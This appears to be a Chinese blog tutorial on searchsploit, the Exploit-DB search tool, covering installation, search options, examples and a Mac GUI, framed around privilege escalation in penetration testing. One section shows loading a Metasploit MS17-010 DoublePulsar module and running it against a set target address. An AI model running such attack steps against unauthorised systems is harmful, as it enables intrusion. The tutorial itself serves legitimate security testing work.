#  searchsploit漏洞辅助利用工具   
原创 simeon的文章  小兵搞安全   2024-12-03 15:04  
  
    在提权过程中需要通过掌握的信息来对系统、软件等存在的漏洞进行搜索，获取其利用的poc，通过编译后，实施提权。searchsploit提供漏洞本地和在线查询，是渗透测试中提权的重要武器。  
### 1.1searchsploit简介  
  
Exploit Database（https://github.com/offensive-security/exploit-database）这是Offensive Security（https://www.offensive-security.com/）赞助的一个项目。存储了大量的漏洞利用程序，可以帮助安全研究者和渗透测试工程师更好的进行安全测试工作，目前是世界上公开收集漏洞最全的数据库，该仓库每天都会更新，exploit-db提供searchsploit利用files.csv进行搜索离线漏洞库文件的位置。searchsploit 是一个用于搜索 Exploit-DB 数据库中已知漏洞利用代码和安全工具的命令行工具。它是由 Offensive Security（Kali Linux 背后的公司）开发的，是 Kali Linux 发行版的一部分，但也可以在其他 Linux 发行版上安装和使用。  
### 1.2searchsploit下载、安装及更新  
  
1.  
下载  
  
https://codeload.github.com/offensive-security/exploit-database/zip/master  
  
git  
当前目录：  
  
git clone  
https://github.com/offensive-security/exploit-database.git  
  
git  
到  
/opt/exploit-database  
  
git clone https://github.com/offensive-security/exploit-database.git /opt/exploit-database  
  
2.  
安装  
  
（  
1  
）  
centos  
安装：  
yum install exploitdb  
  
（  
2  
）  
MacOS  
安装：  
brew update && brew install exploitdb  
  
（  
3  
）  
kali  
安装：  
apt update && apt -y install exploitdb  
  
使用命令关联  
searchsploit  
：  
  
  
ln -sf /opt/exploit-database/searchsploit  
   
/usr/local/bin/searchsploit  
  
3.  
更新  
  
searchsploit  
  
–u  
### 1.3searchsploit语法  
  
1.  
用法  
  
searchsploit  [选项] term1 [term2] ... [termN]  
  
选项：  
  
-c, --case     [关键词]      进行大小写敏感的搜索（默认为不区分大小写）  
  
-e, --exact    [关键词]      对漏洞标题进行精确匹配和顺序匹配（默认为每个词的AND匹配）[隐含"-t"]  
  
例如："WordPress 4.1" 不会匹配 "WordPress Core 4.1"  
  
-s, --strict               进行严格搜索，输入值必须存在，禁用版本范围的模糊搜索  
  
例如："1.1" 不会被检测为 "1.0 < 1.3"  
  
-t, --title    [关键词]      仅搜索漏洞标题（默认为标题和文件路径的AND匹配）  
  
--exclude="关键词"       从结果中移除某些值。使用 "|" 分隔多个值  
  
例如：--exclude="term1|term2|term3"  
  
--cve      [CVE]       搜索通用漏洞披露（CVE）值  
  
输出  
  
-j, --json     [关键词]      以JSON格式显示结果  
  
-o, --overflow [关键词]      允许漏洞标题超出列宽  
  
-p, --path     [EDB-ID]    显示漏洞的完整路径（如果可能还会复制路径到剪贴板）  
  
-v, --verbose              在输出中显示更多信息  
  
-w, --www      [关键词]      显示指向 Exploit-DB.com 的URL而不是本地路径  
  
--id                   显示 EDB-ID 值而不是本地路径  
  
--disable-colour       禁用搜索结果中的颜色高亮  
  
非搜索操作  
  
-m, --mirror   [EDB-ID]    将漏洞镜像（即复制）到当前工作目录  
  
-x, --examine  [EDB-ID]    使用 $PAGER 查看漏洞  
  
非搜索操作  
  
-h, --help                 显示此帮助屏幕  
  
-u, --update               检查并安装任何 exploitdb 包更新（brew、deb 和 git）  
  
  --nmap     [file.xml]  检查 Nmap XML 输出中的所有结果与服务版本  
  
                           例如：nmap [主机] -sV -oX file.xml  
  
注意事项：  
  
（1）可以使用任意数量的搜索词  
  
（2）默认情况下，搜索词不区分大小写，顺序无关紧要，并将在版本范围内进行搜索  
  
（3）如果希望减少结果数量，可以通过 '-c' 进行大小写敏感搜索  
  
（4）或者通过 '-e' 使用精确匹配来过滤结果  
  
（5）或者通过 '-s' 查找精确版本匹配  
  
（6）使用 '-t' 排除文件路径以过滤搜索结果移除误报（特别是使用数字搜索时，如版本号）  
  
（7）使用 '--nmap' 时，添加 '-v'（详细），它将搜索更多的组合  
  
2.使用实例  
  
（1）更新searchsploit  
  
sudo searchsploit -u  
  
执行后searchsploit -u，searchsploit会更新漏洞库到最新版本，如图1所示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzI168pW3frSHdwnMWOhW9x2r1IDFp8OJhHwTF1FEnPRKbVtAC5SB4ftA/640?wx_fmt=png&from=appmsg "")  
  
  
图1 更新  
searchsploit漏洞库  
  
（2）查看帮助  
  
searchsploit -h  
  
（3）搜索漏洞关键字afd的Windows本地利用漏洞  
  
searchsploit afd windows local  
  
搜索结果如图2所示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzI6o9xf5H2zxxSKZATdVeMoWkwdlfibzQWmllUH0hCQJhWrqicbrMn1bAQ/640?wx_fmt=png&from=appmsg "")  
  
图2 搜索  
afd的Windows本地利用漏洞  
  
（4）搜索标题中包含oracle windows的漏洞  
  
searchsploit -t oracle windows  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIQ4ZTibFT1E3IGTrsLwsJsn5mxhuId7tP7l76iarNV9cl3vTN8BCls99Q/640?wx_fmt=png&from=appmsg "")  
  
  
（5）搜索漏洞号为39446的漏洞  
  
searchsploit -p 39446  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIg1v4XmoNRLcN6vdxru7VbzQbhAsWWCzCmRjjTUib7teqhM9Nao7LRkQ/640?wx_fmt=png&from=appmsg "")  
  
  
（6）排除dos以及PoC值的包含linux kernel 3.2的漏洞  
  
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIWp4TTDtZoL1RWicWvgk57ayLf6t94hsNicBbwg0raqWkIAUhv1QjfmTg/640?wx_fmt=png&from=appmsg "")  
  
  
（7）查找mssql的漏洞  
  
searchsploit mssql  
  
（8）查找和window XP有关的漏洞  
  
searchsploit /xp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzI2cFuibgFLSFUfoCul1WhRKDYJp80nERo8eeEicMVq2owKAHUcCbHUzsQ/640?wx_fmt=png&from=appmsg "")  
  
  
（9）查找apple的漏洞  
  
searchsploit apple  
  
1.4searchsploit 配合msf使用  
  
在使用searchsploit搭配Metasploit Framework (MSF)时，可以利用searchsploit找到漏洞和exploit，然后将其载入到MSF中以便进一步的利用和测试。单独的searchsploit使用起来不方便，虽然搜索会出来很多结果，包括利用代码，但没有对其进行整合，有些代码需要安装对应的模块才能使用，否则会报错。  
  
1.使用search及searchsploit查找漏洞  
  
searchsploit ms17-010  
  
search ms17-010  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzI3sQSEO3ALEI6niamJBWkdsJPyXmK1iaExJBEAWOGJ8mOiczic51r2iaHMYg/640?wx_fmt=png&from=appmsg "")  
  
2.将search找到的exploit载入到MSF  
  
（1）从结果中选择一个最佳（great）的来载入。  
  
use exploit/windows/smb/smb_doublepulsar_rce  
  
（2）show options  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIicSeWicro1z0Sy0t7MSmvtPoHG5rAe59mHZic3Gwa2p1gUPaFU1zELTSQ/640?wx_fmt=png&from=appmsg "")  
  
  
（3）设置参数  
  
set RHOSTS 192.168.10.1  
  
set lhost 192.168.1.1  
  
exploit  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIz9DRqjzb1X5ZumCjXWkBJRqSCIh6QCjEh1fYiaGNOjcQs1iayB0xv2rA/640?wx_fmt=png&from=appmsg "")  
  
  
这里仅仅是演示search漏洞跟msf的配置，实际测试中需要配置真实可用的lhost及rhosts地址。  
### 1.5技巧  
  
1.  
查询关键字采取  
AND  
运算  
  
SearchSploit  
使用  
AND  
运算符，而不是  
OR  
运算符。使用的术语越多，滤除的结果越多。  
  
2.  
使用名称搜索时尽量使用全称  
  
3.  
使用“  
-t  
”选项  
  
默认情况下，  
searchsploit  
将检查该漏洞利用的标题以及该路径。根据搜索条件，这可能会导致误报（特别是在搜索与平台和版本号匹配的术语时），使用“  
-t  
”选项去掉多余数据。例如  
searchsploit -t oracle windows  
显示  
7  
行数据而  
searchsploit  
  
  
oracle windows |wc –l  
显示  
90  
行数据。  
  
4.  
在线搜索  
exploit-db.com  
中的关键字漏洞  
  
searchsploit  
  
WarFTP 1.65 -w  
  
5.  
搜索微软漏洞  
  
  
搜索微软  
2014  
年的所有漏洞，关键字可以  
ms14  
，  
ms15  
，  
ms16  
，  
ms17  
  
searchsploit MS14  
  
6.查看漏洞详细信息  
  
searchsploit  linux/local/21158.c -x  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIAiaMtIR6YzNJDhibZ0HxgGWWvxkC22vFpR2ONp8MM9HuwmIJms6N7NRQ/640?wx_fmt=png&from=appmsg "")  
  
### 1.6SearchSploit-GUI版本  
  
也有安全爱好者将SearchSploit整合成图形界面，不过该版本仅仅适合mac版本，下载地址：  
  
https://github.com/tibOin/SearchSploit-GUI。  
  
1.执行搜索  
  
运行后，直接搜索mysql udf，如图所示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIP6GDIAvL24s6dmzic4poib2HGffTm3tCSMr5SQvUjtuqbuvxmbqaxnicw/640?wx_fmt=png&from=appmsg "")  
  
  
2.查看Exploit详细信息  
  
双击搜索的记录，即可查看详细信息，如图所示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHVzuTpiaV2zzYlqzufjEXzIP6GpWHu66DViamR6apianpbjy2n6PiaWkMW4Ydh1jyKIkhIYuM3HsBqbw/640?wx_fmt=png&from=appmsg "")  
  
最近有些小忙，经济形势依然不乐观，在别人悲观时要保持乐观，积极学习，准备，防止被裁掉。以不变应万变。每天进步一点点，积少成多。另有喜欢安全研究和交流的朋友，可以加微信lovesec2022拉群进行交流。  
  
  
  
